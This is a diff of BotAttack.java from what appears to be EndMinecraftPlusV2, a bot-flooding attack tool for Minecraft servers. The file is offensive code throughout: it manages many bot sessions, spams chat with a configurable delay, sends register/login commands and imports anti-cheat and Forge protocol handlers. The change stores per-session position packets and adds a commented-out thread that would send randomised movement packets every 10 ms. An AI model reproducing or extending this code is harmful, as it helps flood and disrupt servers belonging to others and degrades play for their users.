@@ -1,10 +1,10 @@
 package cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.AttackUtils;
 
+import cn.serendipityr.EndMinecraftPlusV2.Tools.*;
+import cn.serendipityr.EndMinecraftPlusV2.VersionControl.AttackManager;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.ACProtocol.AnotherStarAntiCheat;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.ACProtocol.AntiCheat3;
-import cn.serendipityr.EndMinecraftPlusV2.VersionControl.AttackManager;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.ForgeProtocol.MCForge;
-import cn.serendipityr.EndMinecraftPlusV2.Tools.*;
 import io.netty.util.internal.ConcurrentSet;
 import org.spacehq.mc.protocol.MinecraftProtocol;
 import org.spacehq.mc.protocol.data.message.Message;
@@ -20,6 +20,7 @@ import org.spacehq.packetlib.Session;
 import org.spacehq.packetlib.event.session.*;
 import org.spacehq.packetlib.packet.Packet;
 import org.spacehq.packetlib.tcp.TcpSessionFactory;
+
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
@@ -36,6 +37,7 @@ public class BotAttack extends IAttack {
     public static int rejoin = 0;
     public static int clickVerifies = 0;
     public static List<String> alivePlayers = new ArrayList<>();
+    public static HashMap<Session,ServerPlayerPositionRotationPacket> positionPacket = new HashMap<>();
     protected boolean attack_motdbefore;
     protected boolean attack_tab;
     protected Map<String, String> modList;
@@ -74,9 +76,22 @@ public class BotAttack extends IAttack {
                         if (c.getSession().hasFlag("login")) {
                             if (ConfigUtil.ChatSpam) {
                                 c.getSession().send(new ClientChatPacket(getRandMessage(clientName.get(c))));
+                                OtherUtils.doSleep(ConfigUtil.ChatDelay);
                             }
 
-                            OtherUtils.doSleep(ConfigUtil.ChatDelay);
+                            /*if (positionPacket != null) {
+                                new Thread(() -> {
+                                    while (c.getSession().isConnected() && positionPacket.containsKey(c.getSession())) {
+                                        MultiVersionPacket.sendPosPacket(c.getSession(), positionPacket.get(c.getSession()).getX() + OtherUtils.getRandomInt(-10, 10), positionPacket.get(c.getSession()).getY() + OtherUtils.getRandomInt(2, 8), positionPacket.get(c.getSession()).getZ() + OtherUtils.getRandomInt(-10, 10), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
+
+                                        try {
+                                            Thread.sleep(10);
+                                        } catch (InterruptedException e) {
+                                            throw new RuntimeException(e);
+                                        }
+                                    }
+                                }).start();
+                            }*/
                         } else if (c.getSession().hasFlag("join")) {
                             if (ConfigUtil.RegisterAndLogin) {
                                 for (String cmd:ConfigUtil.RegisterCommands) {
@@ -331,6 +346,10 @@ public class BotAttack extends IAttack {
                 MultiVersionPacket.sendPosPacket(session, packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
                 session.send(new ClientPlayerMovementPacket(true));
                 MultiVersionPacket.sendClientTeleportConfirmPacket(session, packet);
+
+                if (!positionPacket.containsKey(session)) {
+                    positionPacket.put(session, packet);
+                }
             } catch (Exception ignored) {}
 
         } else if (recvPacket instanceof ServerChatPacket) {
